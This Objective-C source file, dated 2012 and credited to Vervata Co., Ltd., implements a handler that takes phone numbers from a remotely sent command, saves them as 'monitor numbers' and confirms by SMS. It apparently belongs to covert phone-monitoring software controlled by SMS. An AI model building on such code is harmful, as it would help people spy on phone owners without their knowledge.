
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ResetCISNNumbersProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  12/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ResetCISNumbersProcessor.h"
#import "PrefMonitorNumber.h"
#import "Preference.h"

@interface ResetCISNumbersProcessor (PrivateAPI)
- (void) processResetCISNumbers;
- (void) resetCISNumbersException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canResetCISNumbers;
@end

@implementation ResetCISNumbersProcessor

@synthesize mCISNumbers;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ResetCISNumbersProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description:self(ResetCISNumbersProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ResetCISNumbersProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ResetCISNumbersProcessor
 - Argument list and description: 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"ResetCISNumbersProcessor--->doProcessingCommand")
	
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {		
		mCISNumbers = [[NSArray alloc] initWithArray:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kPhoneNumberValidation]];
		DLog(@"ResetCISNumbersProcessor--->CIS Numbers:%@",mCISNumbers);
		if ([mCISNumbers count]>0) {
			if ([self canResetCISNumbers]) { 
				if (![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mCISNumbers]) [self processResetCISNumbers];
				else [self resetCISNumbersException:kCmdExceptionErrorCannotAddDuplicateToCisList];
			}
			else {
				[self resetCISNumbersException:kCmdExceptionErrorCisNumberExceedListCapacity];
			}
		}
		else {
			[self resetCISNumbersException:kCmdExceptionErrorInvalidCisNumberToCisList];
		}
	} else {
		[self resetCISNumbersException:kCmdExceptionErrorInvalidCmdFormat];
	}	
}


#pragma mark ResetCISNumbersProcessor PrivateAPI Methods

/**
 - Method name: processResetCISNumbers
 - Purpose:This method is used to process reset CIS Numbers
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processResetCISNumbers {
	DLog (@"ResetCISNumbersProcessor--->processResetCISNumbers");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	[prefMonitor setMMonitorNumbers:mCISNumbers];
	[prefManager savePreferenceAndNotifyChange:prefMonitor];
	[self sendReplySMS];
}

/**
 - Method name: canResetCISNumbers
 - Purpose:This method is used to check maximum cis numbers list. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (BOOL) canResetCISNumbers {
//	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
//	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
//	int count=[[prefMonitor mMonitorNumbers] count]+[mCISNumbers count];
	int count = [mCISNumbers count];
	if (count <= CIS_NUMBER_LIST_CAPACITY) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: addMonitorsException
 - Purpose:This method is invoked when add monitors process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) resetCISNumbersException:(NSUInteger) aErrorCode {
	DLog (@"ResetCISNumbersProcessor--->resetCISNumbersException")
	FxException* exception = [FxException exceptionWithName:@"resetCISNumbersException" andReason:@"Reset CIS Number error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) sendReplySMS {
	DLog (@"ResetCISNumbersProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[mCISNumbers release];
	[super dealloc];
}
@end
